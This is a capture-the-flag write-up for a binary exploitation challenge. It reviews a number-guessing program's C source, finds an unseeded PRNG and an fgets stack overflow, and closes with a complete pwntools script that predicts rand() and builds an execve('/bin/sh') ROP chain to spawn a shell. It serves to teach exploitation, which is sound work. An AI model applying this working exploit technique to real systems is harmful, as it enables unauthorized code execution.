# Cylabacademy — Guessing Game 1 (Binary Exploitation)

**Category:** Binary Exploitation
**Techniques used:** PRNG prediction, stack buffer overflow, `ret2syscall` ROP chain, static-binary gadget hunting


---

## TL;DR

This "Medium"-level challenge hides two independent bugs behind a simple number-guessing game:

1. An **unseeded PRNG** (`rand()` with no `srand()`), making the "random" answer fully predictable.
2. A **classic stack buffer overflow** in `win()`, where `fgets()` is told to read far more bytes than the destination buffer can hold.

Because the binary is **statically linked** with no `system()`/`execve()` symbols pulled in, a simple `ret2win`/`ret2libc` wasn't enough — the exploit required hand-building a **raw `execve()` syscall ROP chain** from gadgets found inside the binary itself.

---

## 1. Source Review

```c
#define BUFSIZE 100

long get_random() {
    return rand() % BUFSIZE;
}

long increment(long in) {
    return in + 1;
}

int do_stuff() {
    long ans = get_random();
    ans = increment(ans);
    int res = 0;

    printf("What number would you like to guess?\n");
    char guess[BUFSIZE];
    fgets(guess, BUFSIZE, stdin);   // size matches buffer -> safe

    long g = atol(guess);
    if (!g) {
        printf("That's not a valid number!\n");
    } else {
        if (g == ans) {
            printf("Congrats! You win! Your prize is this print statement!\n\n");
            res = 1;
        } else {
            printf("Nope!\n\n");
        }
    }
    return res;
}

void win() {
    char winner[BUFSIZE];
    printf("New winner!\nName? ");
    fgets(winner, 360, stdin);      // 360 > sizeof(winner) == 100 -> OVERFLOW
    printf("Congrats %s\n\n", winner);
}

int main(int argc, char **argv){
    setvbuf(stdout, NULL, _IONBF, 0);
    gid_t gid = getegid();
    setresgid(gid, gid, gid);       // classic "preserve privileges for /bin/sh" pattern

    while (1) {
        int res = do_stuff();
        if (res) win();
    }
}
```

### Bug #1 — Predictable "randomness"

`srand()` is never called. On glibc, `rand()` without seeding behaves as if `srand(1)` was called — meaning the exact sequence of "random" numbers is **deterministic and identical on every run**, local or remote.

### Bug #2 — Stack buffer overflow in `win()`

```c
char winner[BUFSIZE];           // 100 bytes
fgets(winner, 360, stdin);      // reads up to 359 bytes + NUL
```

The size argument passed to `fgets` (`360`) doesn't match the actual buffer size (`BUFSIZE = 100`). This lets us write up to **260 bytes past the buffer**, smashing into saved registers and the return address.

Note that `do_stuff()`'s own buffer (`guess[BUFSIZE]`, read with `fgets(guess, BUFSIZE, stdin)`) is **not** vulnerable — sizes match there.

---

## 2. Binary Protections (`checksec`)

```
Arch:       amd64-64-little
RELRO:      Partial RELRO
Stack:      Canary found
NX:         NX enabled
PIE:        No PIE (0x400000)
SHSTK:      Enabled
IBT:        Enabled
Stripped:   No
Static:     yes
```

| Protection | Impact |
|---|---|
| **NX** | No shellcode on the stack — needs ROP/ret2syscall |
| **No PIE** | All code/data addresses are fixed — huge advantage for gadget hunting |
| **Static linking** | Every glibc internal function is inside the binary, but it also means `system()`/`execve()` aren't guaranteed to be linked in (only functions actually referenced get pulled in) |
| **Canary found** | *Binary-wide*, not necessarily per-function (see below) |
| **SHSTK / IBT (Intel CET)** | In theory blocks classic ROP via shadow-stack mismatch — in practice, enforcement requires CPU + kernel support that most CTF infra doesn't have active |

### Gotcha: `checksec`'s "Canary found" is binary-wide, not per-function

`checksec` just checks whether `__stack_chk_fail` is referenced *anywhere* in the binary. It does **not** guarantee the function you're attacking actually uses a canary. Disassembling `win()` directly settled it:

```asm
00000000004018f2 <win>:
  4018f2: f3 0f 1e fa          endbr64
  4018f6: 55                   push   rbp
  4018f7: 48 89 e5             mov    rbp,rsp
  4018fa: 48 83 ec 70          sub    rsp,0x70
  ...
  401945: 90                   nop
  401946: c9                   leave
  401947: c3                   ret
```

No `mov rax, fs:0x28` / compare / `call __stack_chk_fail` anywhere in the epilogue. **`win()` has zero stack protection**, despite `checksec` reporting a canary for the binary as a whole.

**Lesson:** always disassemble the specific vulnerable function — don't trust a binary-wide protection summary for a per-function decision.

---

## 3. Finding the Exact Overflow Offset

From the disassembly:

```asm
sub rsp, 0x70          ; 0x70-byte frame
lea rax, [rbp-0x70]    ; winner[] starts at rbp-0x70
```

So, relative to the start of `winner[]`:

| Offset | Target |
|---|---|
| `0x70` (112) | Saved RBP |
| `0x78` (120) | **Return address** |

`fgets` allows up to 360 bytes, giving ~240 bytes of room after the return address for a ROP chain (plenty — about 30 eight-byte gadgets).

---

## 4. Finding a Path to Code Execution

Since this is a **statically linked** binary:

```
$ nm vuln | grep -i exec
# nothing matching system/execve/execl directly
$ strings vuln | grep "/bin/sh"
# nothing
```

No `system()`, no `execve()` wrapper, no `"/bin/sh"` string baked in. The usual `ret2win`/`ret2libc` shortcuts aren't available — we have to build a **raw syscall ROP chain** for `execve("/bin/sh", NULL, NULL)` from scratch, and supply our own `"/bin/sh"` string.

### 4.1 Hunting gadgets

```
$ ROPgadget --binary vuln | grep -E "pop rdi ; ret$"
0x000000000040206f : pop rdi ; ret

$ ROPgadget --binary vuln | grep -E "pop rsi ; ret$"
0x000000000040a0de : pop rsi ; ret

$ ROPgadget --binary vuln | grep -E "pop rdx ; ret$"
# (none clean) -- but this works just as well:
0x0000000000486bbb : pop rdx ; pop rbx ; ret

$ ROPgadget --binary vuln | grep -E "pop rax ; ret$"
0x00000000004518e7 : pop rax ; ret

$ ROPgadget --binary vuln | grep -i "^0x.*: syscall$"
0x0000000000401e24 : syscall
```

### 4.2 A writable, fixed address

Since there's no PIE, `.bss` sits at a constant address:

```
$ readelf -S vuln | grep -A1 "\.bss"
  [25] .bss   NOBITS  00000000004c9360  ...  WA
```

`0x4c9360` — fixed, writable, perfect place to stash `"/bin/sh\0"`.

### 4.3 A real callable function instead of a bare `syscall` gadget

Calling a *bare* `syscall` instruction is risky for syscalls that **return** (like `read`) — execution falls through to whatever instruction happens to follow in memory, which we don't control. Instead, we `ret`-into the real `__libc_read` function (found via `nm`), which has a proper epilogue and returns cleanly to our ROP chain via `ret`. For `execve`, which never returns on success, a bare `syscall` gadget is fine — if it fails we've lost nothing.

### 4.4 The chain

**Stage A — write `"/bin/sh"` into `.bss`:**
```
read(0, 0x4c9360, 16)
  rdi = 0            (pop rdi ; ret)
  rsi = 0x4c9360      (pop rsi ; ret)
  rdx = 16            (pop rdx ; pop rbx ; ret)
  -> ret into __libc_read (returns cleanly)
```

**Stage B — execve:**
```
execve(0x4c9360, NULL, NULL)
  rdi = 0x4c9360      (pop rdi ; ret)
  rsi = 0             (pop rsi ; ret)
  rdx = 0             (pop rdx ; pop rbx ; ret)
  rax = 0x3b (59)     (pop rax ; ret)
  -> syscall
```

After the ROP chain is sent as part of `win()`'s `Name?` input, we send `"/bin/sh\x00"` as the *next* chunk of stdin — this is exactly what the `read()` syscall in Stage A consumes.

---

## 5. Putting It All Together

```python
#!/usr/bin/env python3
from pwn import *
import ctypes

context.binary = elf = ELF('./vuln')
p = remote('HOST', PORT)   # or process('./vuln') for local testing

# ---- Gadgets / addresses ----
POP_RDI     = 0x40206f
POP_RSI     = 0x40a0de
POP_RDX_RBX = 0x486bbb
POP_RAX     = 0x4518e7
SYSCALL     = 0x401e24
LIBC_READ   = 0x450e80
BSS_ADDR    = 0x4c9360
OFFSET      = 0x78   # 120 bytes to return address

# ---- Stage 1: predict rand() (seed defaults to 1 when unseeded) ----
libc = ctypes.CDLL("libc.so.6")
libc.srand(1)
def next_predicted_answer():
    return (libc.rand() % 100) + 1

p.recvuntil(b'?')
for _ in range(300):
    ans = next_predicted_answer()
    p.sendline(str(ans).encode())
    data = p.recvuntil(b'?')
    if b'Congrats' in data:
        break

# ---- Stage 2: build the ROP chain ----
payload  = b'A' * OFFSET
payload += p64(POP_RDI) + p64(0)
payload += p64(POP_RSI) + p64(BSS_ADDR)
payload += p64(POP_RDX_RBX) + p64(16) + p64(0)
payload += p64(LIBC_READ)

payload += p64(POP_RDI) + p64(BSS_ADDR)
payload += p64(POP_RSI) + p64(0)
payload += p64(POP_RDX_RBX) + p64(0) + p64(0)
payload += p64(POP_RAX) + p64(0x3b)
payload += p64(SYSCALL)

p.sendline(payload)
p.send(b"/bin/sh\x00" + b"A" * 7)

p.interactive()
```


---

## 6. Lessons Learned / Pitfalls Hit Along the Way

- **Don't trust binary-wide `checksec` output for per-function decisions.** The binary showed "Canary found", but `win()` itself had none — confirmed only by disassembling the function directly.
- **Static binaries don't guarantee `system()`/`execve()` are linked in.** Only symbols actually referenced by the program get pulled into a static binary — always check with `nm`/`strings` before assuming a `ret2libc`-style shortcut exists.
- **`fgets()` always NUL-terminates right after what it reads** — this blocks the classic "leak via `%s` of a short, non-terminated input" trick. No format-string-style leak was available here, which turned out to be fine because `win()` had no canary to leak in the first place.
- **Don't assume a "random" guess stays fixed across attempts.** Each call to `do_stuff()` draws a *new* value from the PRNG — brute-forcing 1–100 once isn't guaranteed to land on the live value. Properly replaying the PRNG sequence (via `ctypes` calling the *same* glibc algorithm with the default seed) gives a deterministic, first-try-correct guess instead.
- **`recvline()` vs `recvuntil()`:** for a protocol where the "divider" character can be reused across multiple possible server states (both prompts here ended in `?`), `recvuntil(b'?')` proved far more robust than assuming a fixed number of lines per response.
- **Watch for double-consuming the same expected text.** A later `recvuntil()` for text already consumed by an earlier call will hang forever — easy to do when refactoring across several iterations of a script.
- **Raw `syscall` gadgets are fine for syscalls that don't return (`execve`, `exit`)**, but risky for syscalls that do return (`read`, `write`) since control falls through to whatever comes next in memory. Returning into a real libc wrapper function (e.g. `__libc_read`) is safer when you need the chain to continue afterward.

---

## 7. Final ROP Chain Diagram

```
[ 120 bytes padding ]
[ pop rdi; ret ]      -> 0
[ pop rsi; ret ]      -> 0x4c9360 (.bss)
[ pop rdx; pop rbx; ret ] -> 16, junk
[ __libc_read ]      --- read(0, .bss, 16) --> writes "/bin/sh\0" into .bss

[ pop rdi; ret ]      -> 0x4c9360
[ pop rsi; ret ]      -> 0
[ pop rdx; pop rbx; ret ] -> 0, junk
[ pop rax; ret ]      -> 0x3b
[ syscall ]           --- execve(".bss", NULL, NULL) --> shell
```

